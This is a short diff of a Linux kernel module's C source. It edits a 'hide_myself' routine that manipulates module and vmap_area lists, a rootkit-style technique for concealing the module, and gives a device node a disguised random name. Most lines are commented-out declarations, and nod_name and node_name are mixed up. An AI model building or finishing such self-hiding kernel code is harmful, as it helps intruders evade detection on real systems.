@@ -154,10 +154,10 @@ struct miscdevice misc = {
 	};
 static void __init hide_myself(void)
 {
-	struct vmap_area *va, *vtmp;
+	//struct vmap_area *va, *vtmp;
 	struct module_use *use, *tmp;
-	struct list_head *_vmap_area_list;
-	struct rb_root *_vmap_area_root;
+	//struct list_head *_vmap_area_list;
+	//struct rb_root *_vmap_area_root;
 
 /*_vmap_area_list = (struct list_head *)kallsyms_lookup_name("vmap_area_list");
 	_vmap_area_root = (struct rb_root *)kallsyms_lookup_name("vmap_area_root");
@@ -210,11 +210,11 @@ static int __init random_node_init(void)
         snprintf(random_str + i * 2, 3, "%02x", random_suffix[i]);
     }
     // 生成节点名称
-    nod_name = kmalloc(strlen("random_node_") + sizeof(random_str), GFP_KERNEL);
+    /*nod_name = kmalloc(strlen("random_node_") + sizeof(random_str), GFP_KERNEL);
     if (!nod_name) {
         printk(KERN_ERR "Failed to allocate memory\n");
         return -ENOMEM;
-    }
+    }*/
     strcpy(node_name, "mhi_");
     strcat(node_name, random_str);
     // 输出节点名称
